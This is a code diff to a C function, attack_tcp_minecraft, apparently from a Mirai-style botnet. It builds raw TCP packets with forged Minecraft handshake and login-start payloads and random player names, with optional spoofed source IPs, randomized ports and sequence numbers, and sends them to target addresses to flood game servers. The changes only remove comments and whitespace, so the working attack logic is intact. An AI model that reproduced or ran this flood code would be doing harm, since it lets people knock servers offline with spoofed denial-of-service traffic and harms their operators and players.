@@ -1027,10 +1027,9 @@ void attack_tcp_minecraft(uint8_t targs_len, struct attack_target *targs, uint8_
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
             unsigned char *payload = (unsigned char *)(tcph + 1);
             unsigned char *ptr = payload;
-            
-            // Generate random player name (4-16 alphanumeric characters)
+    
             char player_name[17];
-            int name_len = 4 + (rand_next() % 13); // 4-16 characters
+            int name_len = 4 + (rand_next() % 13);
             for (int j = 0; j < name_len; j++) {
                 int r = rand_next() % 62;
                 if (r < 10) player_name[j] = '0' + r;
@@ -1038,9 +1037,8 @@ void attack_tcp_minecraft(uint8_t targs_len, struct attack_target *targs, uint8_
                 else player_name[j] = 'a' + (r - 36);
             }
             player_name[name_len] = 0;
-            
-            // Build Minecraft Handshake Packet (packet ID 0x00)
-            *ptr++ = 0x00; // Packet ID for handshake
+        
+            *ptr++ = 0x00;
             
             // Protocol version (763 for Minecraft 1.20.1)
             int version = protocol_version;
@@ -1049,8 +1047,7 @@ void attack_tcp_minecraft(uint8_t targs_len, struct attack_target *targs, uint8_
                 version >>= 7;
             }
             *ptr++ = version & 0x7F;
-            
-            // Server address (use target IP)
+        
             char ip_str[16];
             uint32_t target_ip = targs[i].netmask < 32 ? 
                 htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) :
@@ -1059,71 +1056,56 @@ void attack_tcp_minecraft(uint8_t targs_len, struct attack_target *targs, uint8_
             addr.s_addr = target_ip;
             inet_ntop(AF_INET, &addr, ip_str, sizeof(ip_str));
             int ip_len = strlen(ip_str);
-            
-            // Write string length
+        
             int len_temp = ip_len;
             while (len_temp >= 0x80) {
                 *ptr++ = (len_temp & 0x7F) | 0x80;
                 len_temp >>= 7;
             }
             *ptr++ = len_temp & 0x7F;
-            
-            // Write IP string
+        
             memcpy(ptr, ip_str, ip_len);
             ptr += ip_len;
-            
-            // Server port (use user-specified port or default)
+        
             uint16_t mc_port = htons(dport);
             *ptr++ = (mc_port >> 8) & 0xFF;
             *ptr++ = mc_port & 0xFF;
-            
-            // Next state: 2 (login)
+        
             *ptr++ = 0x02;
             
-            // Build Login Start Packet (packet ID 0x00 in login state)
-            *ptr++ = 0x00; // Packet ID for login start
-            
-            // Player name length
+            *ptr++ = 0x00;
+
             len_temp = name_len;
             while (len_temp >= 0x80) {
                 *ptr++ = (len_temp & 0x7F) | 0x80;
                 len_temp >>= 7;
             }
             *ptr++ = len_temp & 0x7F;
-            
-            // Player name
+    
             memcpy(ptr, player_name, name_len);
             ptr += name_len;
-            
-            // Update target IP if netmask < 32 (already done above)
+        
             iph->daddr = target_ip;
             
-            // Randomize source IP if specified
             if (source_ip == 0xffffffff)
                 iph->saddr = rand_next();
-            
-            // Randomize IP ID
+        
             if (ip_ident == 0xffff)
                 iph->id = htons(rand_next() & 0xffff);
             
-            // Randomize source port
             if (sport == 0xffff)
                 tcph->source = htons(rand_next() & 0xffff);
-            
-            // Randomize sequence numbers
+        
             if (seq == 0xffff)
                 tcph->seq = htonl(rand_next());
             if (ack == 0xffff)
                 tcph->ack_seq = htonl(rand_next());
-            
-            // Randomize TCP window
+        
             tcph->window = htons(rand_next() & 0xffff);
-            
-            // Update IP checksum
+        
             iph->check = 0;
             iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
-
-            // Update TCP checksum
+            
             tcph->check = 0;
             int payload_len = ptr - payload;
             int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
@@ -1132,7 +1114,6 @@ void attack_tcp_minecraft(uint8_t targs_len, struct attack_target *targs, uint8_
             tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + payload_len), 
                                         sizeof(struct tcphdr) + payload_len);
 
-            // Send packet
             targs[i].sock_addr.sin_addr.s_addr = target_ip;
             targs[i].sock_addr.sin_port = tcph->dest;
             sendto(fd, pkt, total_len, MSG_NOSIGNAL, 
